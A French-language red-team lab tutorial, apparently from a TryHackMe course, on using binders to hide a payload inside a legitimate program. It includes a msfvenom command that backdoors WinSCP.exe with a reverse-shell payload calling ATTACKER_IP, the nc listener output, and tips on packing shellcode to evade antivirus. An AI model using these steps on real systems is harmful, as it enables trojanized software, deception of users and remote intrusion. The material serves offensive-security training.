Bien qu'il ne s'agisse pas d'une méthode de contournement antivirus , les classeurs sont également importants lors de la conception d'une charge utile malveillante à distribuer aux utilisateurs finaux. Un classeur est un programme qui fusionne deux (ou plus) exécutables en un seul. Il est souvent utilisé lorsque vous souhaitez distribuer votre charge utile cachée dans un autre programme connu pour tromper les utilisateurs en leur faisant croire qu'ils exécutent un programme différent.

![5c72d80a077a1f8a813a70c01a6561e9](https://github.com/dsgsec/Red-Team/assets/82456829/c327b30f-9a59-4309-b2a9-c8e1537bdd26)

Bien que chaque classeur puisse fonctionner légèrement différemment, ils ajouteront essentiellement le code de votre shellcode à l'intérieur du programme légitime et le feront exécuter d'une manière ou d'une autre.

Vous pouvez, par exemple, modifier le point d'entrée dans l'en-tête PE afin que votre shellcode s'exécute juste avant le programme, puis rediriger l'exécution vers le programme légitime une fois terminé. De cette façon, lorsque l'utilisateur clique sur l'exécutable résultant, votre shellcode sera d'abord exécuté silencieusement et continuera à exécuter le programme normalement sans que l'utilisateur ne s'en aperçoive.

Liaison avec msfvenom

Vous pouvez facilement insérer une charge utile de votre choix dans n'importe quel fichier .exe avec `msfvenom`. Le binaire fonctionnera toujours comme d'habitude mais exécutera une charge utile supplémentaire en silence. La méthode utilisée par msfvenom injecte votre programme malveillant en créant un thread supplémentaire pour celui-ci, elle est donc légèrement différente de ce qui a été mentionné précédemment mais permet d'obtenir le même résultat. Avoir un thread séparé est encore mieux puisque votre programme ne sera pas bloqué en cas d'échec de votre shellcode pour une raison quelconque.

Pour cette tâche, nous allons détourner l'exécutable WinSCP disponible sur `C:\Tools\WinSCP`.

Pour créer un WinSCP.exe de porte dérobée, nous pouvons utiliser la commande suivante sur notre machine Windows :

Remarque : Metasploit est installé sur la machine Windows pour votre commodité, mais la génération de la charge utile peut prendre jusqu'à trois minutes (les avertissements générés peuvent être ignorés en toute sécurité).

Boîte d'attaque

```
C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
```

Le WinSCP-evil.exe résultant exécutera une charge utile reverse_tcp Meterpreter sans que l'utilisateur ne s'en aperçoive. Avant toute chose, pensez à configurer un `nc`écouteur pour recevoir le shell inversé. Lorsque vous exécutez votre exécutable dérobé, il devrait vous lancer un shell inversé tout en continuant à exécuter WinSCP.exe pour l'utilisateur :

| ![06c3bd06d935a937b2af7dace6a41a27](https://github.com/dsgsec/Red-Team/assets/82456829/950eb190-82d0-47cb-9e84-c6c465478194) | ➜ |

Boîte d'attaque

```
user@attackbox$ nc -lvp 7779
Listening on 0.0.0.0 7779
Connection received on 10.10.183.127 49813
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

 |

Classeurs et AV

Les classeurs ne feront pas grand-chose pour cacher votre charge utile à une solution audiovisuelle . Le simple fait de joindre deux exécutables sans aucune modification signifie que l'exécutable résultant déclenchera toujours toute signature effectuée par la charge utile d'origine.

L'utilisation principale des classeurs est de tromper les utilisateurs en leur faisant croire qu'ils exécutent un exécutable légitime plutôt qu'une charge utile malveillante.

Lors de la création d'une charge utile réelle, vous souhaiterez peut-être utiliser des encodeurs, des crypteurs ou des packers pour masquer votre shellcode des AV basés sur des signatures, puis le lier à un exécutable connu afin que l'utilisateur ne sache pas ce qui est exécuté.

N'hésitez pas à essayer de télécharger votre exécutable lié sur le site Web de THM Antivirus Check (lien disponible sur votre bureau) sans aucun emballage, et vous devriez obtenir une détection en retour du serveur, cette méthode ne sera donc pas d'une grande aide lorsque vous essayez de obtenir le drapeau du serveur par lui-même.
